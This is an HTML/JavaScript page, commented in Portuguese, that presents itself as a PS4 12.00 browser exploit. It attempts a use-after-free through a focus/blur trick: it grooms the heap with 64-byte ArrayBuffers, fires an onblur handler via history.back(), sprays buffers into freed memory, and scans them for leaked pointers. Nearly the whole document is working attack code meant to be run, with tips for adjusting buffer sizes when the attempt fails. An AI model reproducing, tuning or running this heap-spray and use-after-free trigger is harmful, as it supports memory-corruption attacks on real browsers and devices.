<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Focus/Blur Exploit</title>
<style>
    body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
    button { padding: 15px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #003300; color: #fff; margin-bottom: 10px; }
    #log { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; }
    .success { background-color: #fff; color: #000; font-weight: bold; border: 5px solid #0f0; }
</style>
</head>
<body>
<h2>PS4 12.00 - Precision Trigger (Blur Method)</h2>
<div id="status">Método: input.onblur (Zero Delay)</div>
<button onclick="runBlurExploit()">INICIAR ATAQUE PRECISO</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var grooming = [];
var targetViews = [];

async function runBlurExploit() {
    logEl.textContent = "";
    grooming = [];
    targetViews = [];
    statusEl.textContent = "Preparando...";

    // 1. SETUP DO DOM PARA O TRUQUE DE FOCO
    const input = document.createElement("input");
    input.id = "trigger";
    document.body.appendChild(input);
    
    const anchor = document.createElement("a");
    anchor.id = "anchor";
    document.body.appendChild(anchor);

    // 2. GROOMING (Preparação do Heap)
    // Enchemos a memória com buffers de 64 bytes (seu tamanho vencedor)
    log("1. Enchendo memória (Grooming 64 bytes)...");
    for(let i=0; i<3000; i++) {
        let buf = new ArrayBuffer(64);
        let view = new Uint32Array(buf);
        view.fill(0x41414141); // AAAA
        grooming.push({buf: buf, view: view});
    }

    // Criar buracos (Swiss Cheese)
    for(let i=0; i<grooming.length; i+=5) {
        grooming[i] = null;
    }

    // 3. O GATILHO MÁGICO (ONBLUR)
    let triggered = false;
    
    input.onblur = function() {
        triggered = true;
        log(">>> EVENTO BLUR DISPARADO (Sincronia Perfeita) <<<");
        
        // SPRAY IMEDIATO
        // Isso roda na mesma thread do free(), sem delay
        for(let i=0; i<500; i++) {
            let buf = new ArrayBuffer(64);
            let view = new Uint32Array(buf);
            
            // Padrão 'BBBB' (0x42424242)
            view.fill(0x42424242); 
            
            // Guardamos a view para checar se ela foi corrompida depois
            targetViews.push(view);
        }
    };

    log("2. Configurando armadilha de histórico...");
    
    // Configura histórico para permitir o 'back'
    history.pushState("state1", "", "#START");
    history.pushState("state2", "", "#END");

    // FOCA NO INPUT
    log("3. Focando input...");
    input.focus();
    await sleep(200); // Garante que o foco foi registrado

    // DISPARA O UAF
    log("4. Executando history.back()...");
    history.back(); 
    // O 'back' vai tirar o foco do input -> dispara onblur -> executa spray

    await sleep(500);

    // 5. VERIFICAÇÃO
    if(!triggered) {
        log("ERRO: O evento onblur não disparou. Clique na página e tente de novo.");
        return;
    }

    log("5. Analisando memória por corrupção...");
    let success = false;
    
    // Checamos nossos buffers 'BBBB'
    // Se o UAF funcionou, o navegador escreveu algo (ponteiro) em cima do nosso 'BBBB'
    for(let i=0; i<targetViews.length; i++) {
        let v = targetViews[i];
        if(v[0] !== 0x42424242) {
            success = true;
            let val = "0x" + v[0].toString(16).padStart(8,'0');
            log(`!!! LEAK DETECTADO NO BUFFER ${i} !!!`);
            log(`Valor lido: ${val}`);
            statusEl.className = "success";
            statusEl.textContent = `LEAK CONFIRMADO: ${val}`;
            break;
        }
    }

    if(!success) {
        log("Falha: Buffers intactos. Tente ajustar o tamanho (ex: 80 bytes).");
        log("Dica: Se falhar 3x com 64 bytes, mude a linha 'new ArrayBuffer(64)' para 80.");
    }

    // Limpeza
    input.remove();
    anchor.remove();
}
</script>
</body>
</html>
